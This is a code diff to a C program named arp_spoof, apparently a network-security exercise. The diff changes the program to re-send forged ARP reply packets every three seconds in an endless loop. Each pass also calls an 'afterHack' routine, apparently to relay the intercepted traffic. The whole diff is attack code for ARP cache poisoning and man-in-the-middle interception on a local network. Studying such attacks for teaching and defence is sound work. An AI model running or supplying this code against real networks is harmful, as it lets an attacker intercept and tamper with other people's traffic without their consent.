@@ -1,8 +1,9 @@
 #include <stdio.h>
-#include <memory.h>
-#include <netinet/if_ether.h>
+#include <unistd.h>
 #include <pcap.h>
+#include <time.h>
 #include "module.h"
+#define PERIOD 3 // seconds
 
 void usage() {
   printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -48,10 +49,20 @@ int main(int argc, char* argv[]) {
 
   if(!(atk_ok && sdr_ok && trg_ok)) return 0;
   
-  if(atk_ok && sdr_ok) sendArpPacket(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip, 2);
-
-  afterHack(handle, attacker_mac_address, target_mac_address, sender_mac_address, sender_ip, target_ip);
+  if(atk_ok && sdr_ok) {
+    time_t start = time(NULL);
+    while(true) {
+      time_t cur = time(NULL);
+      if(cur - start >= PERIOD) {
+        sendArpPacket(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip, 2);
+        start = cur;
+      }
+      afterHack(handle, attacker_mac_address, target_mac_address, sender_mac_address, sender_ip, target_ip);
+      sleep(1);
+    }
+  }
 
   pcap_close(handle);
+
   return 0;
 }
